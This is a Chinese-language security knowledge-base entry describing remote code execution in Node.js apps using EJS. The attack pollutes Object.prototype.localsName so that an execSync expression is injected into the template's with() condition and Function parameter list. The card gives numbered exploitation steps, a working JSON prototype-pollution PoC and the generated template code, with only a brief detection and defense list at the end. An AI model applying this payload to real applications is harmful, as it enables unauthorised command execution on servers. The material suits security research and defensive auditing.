---
id: web-nodejs-prototype-pollution-ejs-localsname-with-rce
title: EJS localsName 原型污染注入：with 条件表达式与 Function 形参双处拼接入模板代码
type: scenario
domain: web
path: web/nodejs/prototype-pollution
technique: ejs-localsname-prototype-pollution-rce
tags:
- nodejs
- prototype-pollution
- ejs
- express
- with
- rce
- template-engine
- javascript
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V560
  verified_at: '2026-11-12T07:42:08+08:00'
  notes: 已对照原文第三处与img13-14核对：localsName同时拼入with条件与new Function形参列表，payload写成x=<execSync表达式>不闭合括号、在with求值时执行的构造与原文一致；与既有EJS字段卡不同字段不同payload，非同链，append_scenario成立；原文未标EJS版本，未设affected_versions；未实际复现
url: /docs/web/nodejs/prototype-pollution/web-nodejs-prototype-pollution-ejs-localsname-with-rce/
draft: false
kb_aliases:
- EJS localsName
- localsName 原型污染
- with(localsName) 注入
- EJS with 绕过 RCE
- 原型链污染 EJS 字段
---

## 一句话结论

EJS 编译模板时把 `opts.localsName` 原样拼进 `with (' + opts.localsName + ' || {}) {` 以及 `new Function(opts.localsName + ', escapeFn, include, rethrow', src)` 两处；原型污染 `Object.prototype.localsName`（如 `x=global.process.mainModule.require('child_process').execSync('calc')`）后，生成的 `with (x=<命令> || {}) {` 在渲染求值时执行赋值表达式，从而 RCE；payload 不闭合 `with`，避免破坏后续 Function 形参列表。

## 原理

- **两处拼接**：
  ```js
  if (opts._with !== false) {
    prepended += '  with (' + opts.localsName + ' || {}) {' + '\n';
    appended += '  }' + '\n';
  }
  ...
  fn = new ctor(opts.localsName + ', escapeFn, include, rethrow', src);
  ```
  `localsName` 既作为 `with` 的括号内表达式，又作为生成函数的第一个形参名（`x=<expr>` 会被 JS 解析为默认参数，`x` 是形参名）。
- **为什么不能闭合**：如果像其他字段那样用 `);<cmd>;//` 闭合 `with`，由于 `localsName` 同时出现在 `new Function` 的形参列表开头，闭合括号会导致形参列表语法错误（`with` 前的 `(` 无法配对）。作者选择不闭合，把命令写成解析后合法的**赋值表达式**放在 `with` 条件位。
- **执行点**：`with ((x=<命令>) || {}) { ... }` 在模板函数执行到该语句时先求值括号内表达式：赋值 `x=<命令>` 立即执行，返回值再与 `{}` 做 `||`，整个过程不抛语法错误。
- **原型污染前提**：`opts.localsName` 沿原型链读取，污染 `Object.prototype.localsName` 即可影响所有渲染；payload 中不要出现会导致后续拼接/形参解析失败的字符。

## 触发条件

- 应用使用 EJS 渲染模板且存在原型污染原语；
- `opts._with` 未显式设为 false（默认 undefined，走 `with` 分支）；
- 攻击者能触发一次模板渲染。

## 利用步骤

1. 确认 EJS 渲染与原型污染入口。
2. 污染 `Object.prototype.localsName` 为赋值表达式形式的命令执行 payload。
3. 触发渲染，确认命令执行与页面返回正常（不报 SyntaxError 即 payload 合法）。
4. 若返回 500/SyntaxError，检查 payload 是否包含破坏 `with` 或形参列表的括号/逗号。

## PoC

```json
{
  "__proto__": {
    "localsName": "x=global.process.mainModule.require('child_process').execSync('calc')"
  }
}
```

生成的模板函数体：

```js
var __output = "";
function __append(s) { if (s !== undefined && s !== null) __output += s }
with (x=global.process.mainModule.require('child_process').execSync('calc') || {}) {
  ...模板输出...
}
```

`new Function` 的形参列表变为 `x=global.process...execSync('calc'), escapeFn, include, rethrow`（`x=<表达式>` 是合法的默认参数），真正的命令触发点是 `with` 条件表达式求值。

## 变体与关联

- 同类 EJS 字段：`outputFunctionName` 见 [[web-nodejs-prototype-pollution-ejs-outputfunctionname-rce]]，`escapeFunction`/`escape` 见 [[web-nodejs-prototype-pollution-lodash-ejs-escapefunction-rce]]，`destructuredLocals` 见 [[web-nodejs-prototype-pollution-ejs-destructuredlocals-rce]]；
- 过滤 `__proto__` 时改用 `constructor.prototype`，见 [[web-nodejs-prototype-pollution-filter-bypass]]；
- 若应用设置了 `_with:false` 或 EJS 版本不生成 with 分支，本字段不可用，需换其他字段。

## 检测与防御

- 修复原型污染源头，避免用户输入进入递归 merge；
- EJS 渲染显式传入 options（含 localsName），并冻结/隔离全局原型；
- 升级 EJS；SAST 审计 `with (` 拼接点与 `new Function` 参数拼接；
- 运行时对 child_process 调用、模板编译异常（SyntaxError 频率）做监控。
